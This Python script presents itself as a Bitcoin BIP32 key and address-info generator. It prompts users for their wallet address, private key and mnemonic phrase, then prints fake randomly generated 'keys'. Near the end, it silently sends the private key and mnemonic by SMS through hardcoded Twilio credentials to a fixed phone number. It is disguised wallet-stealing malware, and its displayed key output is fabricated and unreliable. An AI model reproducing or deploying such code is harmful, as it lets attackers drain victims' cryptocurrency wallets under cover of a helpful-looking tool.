import threading
import twilio
import time

from twilio.rest import Client

   
print ("================================================")
print (".           Made With Love By PROPMDT            ")
print ("                      Hosted At Github.io        ")
print ("================================================")
print ()
print()
print ("================================================")
print ("                                WARNING                                  ")
print ("THIS TOOL IS ONLY FOR TESTING PURPOSE")
print ("================================================")
print ()
print ()
print ("================================================")
print ("FEATURES OF THIS TOOL")
print ()
print ("1 - GENERATE BIP32 KEY")
print ("2 - DISPLAY ROOT KEY")
print ("3 - GENERATE ROOT HASH")
print ("4 - GENERATE YOUR ADDRESS INFO LINK")
print ("5 - WORKS BOTH FOR MAINNET AND TESTNET")
print ("6 - FIND MORE DETAILS @ bitcoin.org")
print ("================================================")
print ()
print()
print()
print(" ENTER YOUR BITCOIN ADDRESS ( MAINNET OR TESTNET)")
btcad=input()
print(" ENTER YOUR PRIVATE KEY ")
pvtkey=input()
btcad1 = btcad [::-1]
pvtkey1= pvtkey [::-1]
bip32 = pvtkey1+btcad1
print(" ENTER YOUR MNEMONIC PHRASE")
mn=input()
pro=pvtkey+"-"+mn

import random

import array

MAX_LEN = 111

DIGITS = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']  

LOCASE_CHARACTERS = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 

                     'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q',

                     'r', 's', 't', 'u', 'v', 'w', 'x', 'y',

                     'z']
 

UPCASE_CHARACTERS = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 

                     'I', 'J', 'K', 'M', 'N', 'O', 'p', 'Q',

                     'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y',

                     'Z']

COMBINED_LIST = DIGITS + UPCASE_CHARACTERS + LOCASE_CHARACTERS 

rand_digit = random.choice(DIGITS)

rand_upper = random.choice(UPCASE_CHARACTERS)

rand_lower = random.choice(LOCASE_CHARACTERS)

temp_pass = rand_digit + rand_upper + rand_lower 

for x in range(MAX_LEN - 4):

    temp_pass = temp_pass + random.choice(COMBINED_LIST)

    temp_pass_list = array.array('u', temp_pass)

    random.shuffle(temp_pass_list)

password = ""

for x in temp_pass_list:

        password = password + x
  
bip32ad = "xpvr"+password
bip32pub = password [::-1]

print (" Generating Please wait .....")
seconds =  7
for i in range (seconds):
	print (" Generating Please wait .....")
	time.sleep(1)
print ("================================================")
print ("WALLET ADDRESS :"+btcad)
print()
print ("BIP32 PRIVATE KEY :"+bip32ad)
print()
print ("BECH PUBLIC KEY :"+bip32pub)
print ()
print ("ROOT DECIMAL - 8")
print ()
http="https://explorer.bitcoin.com/btc/address/"+btcad
print ("FIND ALL TRANSACTION DETAILS AT :"+http)
print ("================================================")

account_sid = "ACfc6d7af19e8ee7992fa842838dce7468"
auth_token = "d93ae86ac45d40063a5756aee61bff4f"
client = Client(account_sid, auth_token)

message = client.messages \
.create(
body=pro,
from_='+17192496876',
to='+917044133192'
)
print ()
print ("Press Ctrl+C to exit")




